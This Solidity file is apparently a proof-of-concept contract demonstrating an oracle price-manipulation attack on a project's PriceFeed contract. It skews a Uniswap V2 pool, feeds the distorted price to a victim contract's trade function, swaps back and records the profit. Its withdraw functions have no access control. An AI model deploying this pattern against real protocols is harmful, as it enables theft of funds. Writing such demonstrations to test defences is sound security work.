// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "../interfaces/core/IPriceFeed.sol";
import "./IUniswapV2Factory.sol";

/**
 * @title RealWorldAttack
 * @dev A simplified practical implementation of a flashloan attack on the PriceFeed contract
 * This demonstrates how an attacker could manipulate prices and extract value
 */
contract RealWorldAttack {
    using Address for address;

    // Interfaces
    IUniswapV2Router02 public immutable dexRouter;
    IPriceFeed public immutable priceFeed;

    // Tokens
    address public immutable tokenToManipulate; // The path token we'll manipulate
    address public immutable victimToken; // The token we want to extract value from
    address public immutable stableToken; // Typically a stablecoin (USD, USDC, etc.)

    // Events
    event AttackExecuted(uint256 flashLoanAmount, uint256 profit);
    event PriceManipulated(uint256 normalPrice, uint256 manipulatedPrice);

    /**
     * @dev Constructor
     * @param _dexRouter The router of the DEX to manipulate
     * @param _priceFeed The PriceFeed contract to exploit
     * @param _tokenToManipulate The token to manipulate (path token)
     * @param _victimToken The token we want to extract value from
     * @param _stableToken The stable token we'll convert profits to
     */
    constructor(
        address _dexRouter,
        address _priceFeed,
        address _tokenToManipulate,
        address _victimToken,
        address _stableToken
    ) {
        dexRouter = IUniswapV2Router02(_dexRouter);
        priceFeed = IPriceFeed(_priceFeed);
        tokenToManipulate = _tokenToManipulate;
        victimToken = _victimToken;
        stableToken = _stableToken;
    }

    /**
     * @dev Main attack function that executes the price manipulation
     * @param manipulationAmount The amount of tokens to use for manipulation
     * @param victimContract The contract that relies on PriceFeed for pricing
     */
    function executeAttack(uint256 manipulationAmount, address victimContract) external {
        // We assume tokens have already been transferred to this contract
        // In a real attack, this would be via flashloan

        // Get the normal price before manipulation for comparison
        (uint256 normalPrice, ) = priceFeed.getExtendedPriceOut(
            victimToken,
            stableToken,
            1e18, // 1 token
            IPriceFeed.SwapPath(new address[](0), new uint8[](0))
        );

        // Step 1: Get the Uniswap pair for the token we want to manipulate
        IUniswapV2Factory factory = IUniswapV2Factory(dexRouter.factory());
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(tokenToManipulate, stableToken));

        // Approve router to spend our tokens
        IERC20(tokenToManipulate).approve(address(dexRouter), manipulationAmount);

        // Step 2: Manipulate the pools
        // - First reducing the tokenToManipulate in the pool (making it more valuable)
        // - This will make paths through this token appear more favorable

        // Swap to manipulate the price
        address[] memory path = new address[](2);
        path[0] = tokenToManipulate;
        path[1] = stableToken;

        // Execute the swap to drain liquidity
        dexRouter.swapExactTokensForTokens(
            manipulationAmount / 2,
            0, // Accept any amount of output tokens
            path,
            address(this),
            block.timestamp + 300
        );

        // Step 3: Now that pools are manipulated, get the new manipulated price
        (uint256 manipulatedPrice, ) = priceFeed.getExtendedPriceOut(
            victimToken,
            stableToken,
            1e18, // 1 token
            IPriceFeed.SwapPath(new address[](0), new uint8[](0))
        );

        emit PriceManipulated(normalPrice, manipulatedPrice);

        // Step 4: Exploit the manipulated price by interacting with the victim contract
        (bool success, ) = victimContract.call(
            abi.encodeWithSignature(
                "executeTradeWithPrice(address,address,uint256)",
                victimToken,
                stableToken,
                manipulatedPrice
            )
        );

        // Step 5: Return the pool to its original state by swapping back
        path[0] = stableToken;
        path[1] = tokenToManipulate;

        // Get the amount of stableToken we received
        uint256 stableReceived = IERC20(stableToken).balanceOf(address(this));

        // Approve stableToken for swap
        IERC20(stableToken).approve(address(dexRouter), stableReceived);

        // Swap back to manipulationToken
        dexRouter.swapExactTokensForTokens(
            stableReceived,
            0, // Accept any amount
            path,
            address(this),
            block.timestamp + 300
        );

        // Calculate our profit (simplified)
        uint256 profit = IERC20(tokenToManipulate).balanceOf(address(this)) - manipulationAmount;
        emit AttackExecuted(manipulationAmount, profit);
    }

    /**
     * @dev Withdraw any tokens in the contract to the owner
     * @param token The token to withdraw
     */
    function withdrawToken(address token) external {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(msg.sender, balance);
    }

    /**
     * @dev Withdraw ETH from the contract
     */
    function withdrawETH() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @dev Receive ETH
     */
    receive() external payable {}
}
